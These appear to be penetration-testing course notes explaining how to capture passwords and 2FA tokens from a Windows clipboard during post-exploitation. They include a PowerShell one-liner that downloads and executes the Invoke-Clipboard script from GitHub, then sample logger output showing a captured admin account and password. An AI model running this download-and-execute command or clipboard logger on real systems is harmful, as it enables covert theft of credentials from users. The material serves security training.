# keylogging

## Clipboard

In many companies, network administrators use password managers to 
store their credentials and copy and paste passwords into login forms. 
As this doesn't involve `typing` the passwords, keystroke logging is not effective in this case. The `clipboard`
 provides access to a significant amount of information, such as the 
pasting of credentials and 2FA soft tokens, as well as the possibility 
to interact directly with the RDP session clipboard.

We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.

### Monitor the Clipboard with PowerShell

Pillaging

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger

```

The script will start to monitor for entries in the clipboard and 
present them in the PowerShell session. We need to be patient and wait 
until we capture sensitive information.

### Capture Credentials from the Clipboard with Invoke-ClipboardLogger

Pillaging

```powershell
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```